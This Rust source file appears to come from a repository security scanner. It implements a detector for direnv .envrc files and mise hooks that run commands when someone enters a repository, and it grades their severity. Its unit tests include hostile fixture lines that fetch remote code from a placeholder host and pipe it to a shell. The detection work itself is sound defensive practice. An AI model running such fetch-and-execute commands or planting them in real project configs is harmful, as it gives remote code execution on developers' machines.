//! T6: shell environment auto-loaders — direnv `.envrc` and mise hooks run
//! when you `cd` into the repository.

use crate::util::{ExecEntry, added_lines, changed_entries, clip, danger, refs_in, str_of, texts};
use serde_json::Value;
use shield_core::{Detector, FileChange, Finding, Severity, Threat};

/// direnv lines that only set up the environment.
fn benign_envrc(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return true;
    }
    let word = l.split_whitespace().next().unwrap_or("");
    if matches!(
        word,
        "dotenv"
            | "dotenv_if_exists"
            | "use"
            | "layout"
            | "PATH_add"
            | "path_add"
            | "watch_file"
            | "strict_env"
            | "source_env"
            | "source_env_if_exists"
            | "source_up"
            | "source_up_if_exists"
            | "unset"
            | "fi"
            | "then"
            | "else"
            | "{"
            | "}"
    ) {
        return true;
    }
    // `export NAME=literal` without command substitution.
    let assign = l.strip_prefix("export ").unwrap_or(l);
    assign.split_once('=').is_some_and(|(k, v)| {
        k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') && !v.contains("$(") && !v.contains('`')
    })
}

fn is_mise(p: &str) -> bool {
    let name = p.rsplit('/').next().unwrap_or(p);
    matches!(name, "mise.toml" | ".mise.toml" | "mise.local.toml" | ".mise.local.toml")
        || p.ends_with(".mise/config.toml")
        || p.ends_with(".config/mise/config.toml")
}

pub struct ShellEnv;

impl Detector for ShellEnv {
    fn name(&self) -> &'static str {
        "shell-env"
    }

    fn interested(&self, c: &FileChange) -> bool {
        let p = c.path.to_ascii_lowercase();
        c.new.is_some() && (p.rsplit('/').next() == Some(".envrc") || is_mise(&p))
    }

    fn scan_file(&self, c: &FileChange, out: &mut Vec<Finding>) {
        let (Some((old, new)), Some(blob)) = (texts(c), c.new.as_ref()) else { return };
        if is_mise(&c.path.to_ascii_lowercase()) {
            mise(&old, &new, &blob.oid, out);
        } else {
            envrc(&old, &new, &blob.oid, out);
        }
    }
}

fn envrc(old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let cmds: Vec<&str> = added_lines(old, new).into_iter().filter(|l| !benign_envrc(l)).collect();
    let Some(first) = cmds.first() else { return };
    let bad = cmds.iter().find(|l| danger(l).is_some());
    let remote = cmds.iter().find(|l| l.trim_start().starts_with("source_url"));
    let (sev, shown) = match (bad, remote) {
        (Some(l), _) => (Severity::Critical, *l),
        (None, Some(l)) => (Severity::High, *l),
        (None, None) => (Severity::Medium, *first),
    };
    let mut f = Finding::new(Threat::T6, "t6.envrc", sev, ".envrc runs commands when you cd into the repo")
        .anchor(format!("{oid}:envrc"))
        .refs(cmds.iter().flat_map(|l| refs_in(l)))
        .detail(format!("{} new command line(s); e.g.: {}", cmds.len(), clip(shown, 200)));
    if let Some(l) = bad {
        f = f.detail(danger(l).unwrap_or_default());
    } else if remote.is_some() {
        f = f.detail("`source_url` downloads and runs a script.");
    }
    out.push(f.detail("direnv asks again after a change, but `direnv allow` runs all of it."));
}

fn mise_entries(text: &str) -> Vec<ExecEntry> {
    let Ok(v) = toml::from_str::<toml::Value>(text) else { return Vec::new() };
    let Ok(v) = serde_json::to_value(v) else { return Vec::new() };
    let mut out = Vec::new();
    if let Some(Value::Object(h)) = v.get("hooks") {
        for (k, x) in h {
            if let Some(cmd) = str_of(x).or_else(|| x.get("script").and_then(str_of)) {
                out.push(ExecEntry { key: format!("hooks.{k}"), command: cmd });
            }
        }
    }
    if let Some(src) = v.pointer("/env/_/source").and_then(str_of) {
        out.push(ExecEntry { key: "env._.source".into(), command: src });
    }
    if let Some(Value::Object(t)) = v.get("tasks") {
        for (k, x) in t {
            if let Some(cmd) = str_of(x).or_else(|| x.get("run").and_then(str_of)) {
                out.push(ExecEntry { key: format!("tasks.{k}"), command: cmd });
            }
        }
    }
    out
}

fn mise(old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let (o, n) = (mise_entries(old), mise_entries(new));
    for e in changed_entries(&o, &n) {
        let bad = danger(&e.command);
        let auto = !e.key.starts_with("tasks.");
        let sev = match (bad, auto) {
            (Some(_), _) => Severity::Critical,
            (None, true) => Severity::High,
            (None, false) => continue,
        };
        let mut f = Finding::new(Threat::T6, "t6.mise", sev, format!("mise config runs `{}` automatically", e.key))
            .anchor(format!("{oid}:{}", e.key))
            .refs(refs_in(&e.command))
            .detail(format!("command: {}", clip(&e.command, 200)));
        if let Some(b) = bad {
            f = f.detail(b);
        }
        out.push(f);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil::{added, modified, scan};

    #[test]
    fn envrc_levels() {
        assert!(scan(&ShellEnv, &added(".envrc", b"dotenv\nuse flake\nexport FOO=bar\nPATH_add bin\n")).is_empty());
        assert_eq!(scan(&ShellEnv, &added(".envrc", b"dotenv\n./scripts/setup.sh\n"))[0].severity, Severity::Medium);
        assert_eq!(
            scan(&ShellEnv, &added(".envrc", b"source_url https://x.example/r sha256-x\n"))[0].severity,
            Severity::High
        );
        let bad = b"export K=$(curl -s https://x.example/k | sh)\n";
        assert_eq!(scan(&ShellEnv, &added(".envrc", bad))[0].severity, Severity::Critical);
        assert!(scan(&ShellEnv, &modified(".envrc", b"./x.sh\n", b"./x.sh\nexport A=1\n")).is_empty());
    }

    #[test]
    fn mise_hooks() {
        let m = "[hooks]\nenter = \"echo hi\"\n[tasks.build]\nrun = \"cargo build\"\n";
        let f = scan(&ShellEnv, &added("mise.toml", m.as_bytes()));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        let m = "[tasks.x]\nrun = \"curl -s https://x.example | bash\"\n";
        assert_eq!(scan(&ShellEnv, &added(".mise.toml", m.as_bytes()))[0].severity, Severity::Critical);
    }
}
